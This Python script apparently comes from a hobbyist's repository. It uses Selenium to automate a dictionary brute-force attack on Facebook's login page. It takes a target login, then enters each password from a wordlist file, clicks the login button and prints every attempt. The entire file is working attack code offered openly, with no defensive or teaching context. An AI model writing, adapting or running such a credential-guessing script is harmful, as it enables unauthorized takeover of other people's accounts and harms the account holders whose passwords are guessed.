
from selenium import webdriver
import time


## Author = [Przemysław Szmaj]
## GitHub = https://github.com/PSZMAJ
## YouTube = https://www.youtube.com/channel/UCewT7Lr5f6LWvqSPXm0JKRw

login = input('Please eneter login: ')
browser = webdriver.Firefox()
browser.get('https://www.facebook.com/login.php')

    
class Attack:

    
    def addlogin(self):
    # locate xpath and send login.
        self.button_username = browser.find_element_by_xpath('//*[@id="email"]')
        self.button_username.click()
        time.sleep(0.5)
        self.button_username.send_keys(login)
        time.sleep(0.5)
        
    def FbBruteForceDictionary(self):
    # this function has a special task:
    # 1. Locate xpath form "password"
    # 2. Send key from dictionary.
    # 3. Locate xpath button login and click.
    
 
        login_attempt = 0
        with open("dict.txt", "r") as file:
            lines = file.readlines()
        for line in lines:
            self.button_password = browser.find_element_by_xpath('//*[@id="pass"]')
            self.button_password.click()
            time.sleep(0.5)
            self.button_password.send_keys(line)
                
            self.button_login = browser.find_element_by_xpath('//*[@id="loginbutton"]')
            self.button_login.click()
            login_attempt = login_attempt + 1
            print("____________________________________________________________")
            print(' Login attempt', login_attempt, ' with key/password : ', line )
            print("____________________________________________________________")
        
p = Attack()
p.addlogin()
p.FbBruteForceDictionary()